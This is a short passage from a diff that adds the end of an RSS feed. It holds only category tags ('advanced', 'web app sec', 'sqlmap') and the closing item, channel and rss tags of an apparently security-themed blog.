+        <category>advanced</category>
+        
+        <category>web app sec</category>
+        
+        
+        <category>sqlmap</category>
+        
+      </item>
+    
+  </channel>
+</rss>
